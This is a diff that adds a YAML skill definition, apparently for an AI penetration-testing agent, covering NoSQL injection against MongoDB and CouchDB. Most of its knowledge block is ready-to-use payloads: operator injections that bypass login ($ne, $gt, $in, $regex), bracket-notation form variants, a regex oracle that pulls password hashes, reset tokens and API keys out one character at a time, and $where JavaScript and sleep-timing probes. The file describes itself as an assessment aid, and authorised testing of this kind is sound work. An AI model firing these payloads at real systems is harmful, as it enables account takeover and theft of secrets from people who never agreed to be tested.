@@ -1,0 +1,57 @@
+schema_version: 1
+version: 3.0.0
+name: nosql-injection
+description: Senior NoSQL injection assessment — MongoDB operator injection ($ne, $gt, $regex), authentication bypass, bracket notation fuzzing, and blind data exfiltration.
+triggers:
+  - nosql
+  - nosql injection
+  - mongodb
+  - mongo
+  - operator injection
+  - $ne
+  - $gt
+  - $regex
+  - $where
+  - couchdb
+tools:
+  - curl
+knowledge: |
+  Assess NoSQL injection across document stores (MongoDB, DocumentDB, CouchDB) with senior offensive engineering precision.
+
+  1. INPUT SHAPE & OPERATOR INJECTION DYNAMICS:
+     NoSQL injection exploits object-level query construction where user inputs are treated as query filters or expression objects rather than scalar strings.
+     - JSON Request Bodies (`application/json`):
+       Inject operator dictionaries directly:
+       `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
+     - Form & URL-Encoded Formats (`application/x-www-form-urlencoded`):
+       Express `body-parser`, PHP, and similar middleware parse bracket notation into nested objects:
+       `username[$ne]=invalid&password[$ne]=invalid`
+
+  2. AUTHENTICATION BYPASS OPERATOR PATTERNS:
+     Target login and token validation endpoints with query logic overrides:
+     • Not-Equal operator: `{"username": "admin", "password": {"$ne": "wrong"}}`
+     • Greater-Than operator: `{"username": "admin", "password": {"$gt": ""}}`
+     • Array Membership: `{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}`
+     • Wildcard Regex: `{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}`
+
+  3. BLIND DATA EXTRACTION VIA REGEX ORACLES:
+     When query results are not directly reflected in response bodies, establish a boolean or status-code oracle:
+     - Extract hidden password hashes, reset tokens, or API keys character-by-character:
+       Test prefix: `{"username": "admin", "token": {"$regex": "^a"}}`
+       If response is true (e.g. HTTP 200 vs 401), character is confirmed.
+     - Advance prefix: `^a`, `^ab`, `^abc` across the alphanumeric character set to recover the full string.
+
+  4. JAVASCRIPT EVALUATION ($where / $function):
+     When the backend passes user input into `$where` evaluations:
+     - Logical true injection:
+       `{"$where": "1 == 1"}` or `username=admin'; return true; var x='`
+     - Response-time differential probes:
+       `{"$where": "this.username == 'admin' && sleep(3000)"}`
+
+  5. STRUCTURED EVIDENCE REPORTING:
+     - Record endpoint, HTTP method, payload structure (JSON vs bracket notation), and proof of authentication bypass or differential response.
+references:
+  - persona:nosql-injection-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/nosql-injection.yaml
